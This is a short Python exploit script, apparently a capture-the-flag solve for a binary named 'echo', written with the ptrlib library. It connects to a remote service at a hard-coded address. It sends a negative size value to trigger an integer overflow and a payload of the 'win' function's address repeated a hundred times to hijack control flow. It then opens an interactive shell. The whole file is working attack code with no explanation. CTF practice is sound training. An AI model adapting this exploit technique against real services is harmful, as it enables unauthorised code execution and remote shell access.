from ptrlib import *

binary = "./echo"
elf = ELF(binary)

"""
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
"""
# libc = ELF("./libc.so.6")
r = Socket("nc 34.170.146.252 17360")
# """


def sla(*args):
    print(args)
    r.sendlineafter(*args)

win = elf.symbol("win")
logger.info("win: " + hex(win))

payload = p64(win) * 100
sla("Size: ", "-2147483648")
sla("Data: ", payload)
r.sh()
